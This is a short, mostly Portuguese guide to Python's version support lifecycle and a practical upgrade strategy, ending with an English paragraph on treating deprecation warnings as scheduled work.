Cada versão minor do Python tem cerca de cinco anos de suporte: uns dois anos de releases com correcções de bugs e depois mais três só com correcções de segurança. A partir daí, nenhum patch de CVE — nem para problemas críticos. Correr um interpretador em fim de vida é um achado de conformidade, não uma preferência.

Estratégia de subida que não exige heroísmos

  1. Acompanha duas versões à frente. Se produção está na 3.12, a CI já corre 3.13 e 3.14. Ficas a saber das incompatibilidades um ano antes de serem urgentes.
  2. Falha em depreciações. -W error::DeprecationWarning nos testes, mais as regras UP do ruff e o pyupgrade. Um aviso que ignoras hoje é uma ruptura que depuras numa janela de subida.
  3. Sobe dependências todos os meses, não todos os anos. Diffs pequenos e revistos de lockfile são aborrecidos; um ano de alterações acumuladas é um projecto. Automatiza o PR, mantém a revisão humana.
  4. Lê o «What's New» e o «Porting to» de cada versão que atravessas. São curtos, precisos e listam remoções que nenhuma quantidade de testes descobre se o caminho não estiver testado.
  5. Testa a versão suportada mais antiga e a mais recente. A mais antiga apanha uso acidental de sintaxe nova; a mais recente apanha depreciações e mudanças de comportamento.
  6. Mantém um caminho de rollback. A versão do interpretador faz parte do artefacto (imagem/digest do contentor). Não subas o runtime no lugar num servidor de estimação.

Why deprecation warnings are a gift Python's deprecation policy is unusually generous: features are announced, warned about for at least two minor releases (often longer), then removed. That window is the entire upgrade budget. Teams that silence warnings spend that budget and then pay it back with interest during an emergency upgrade after an EOL announcement. Treat a new DeprecationWarning as a scheduled task, not noise.
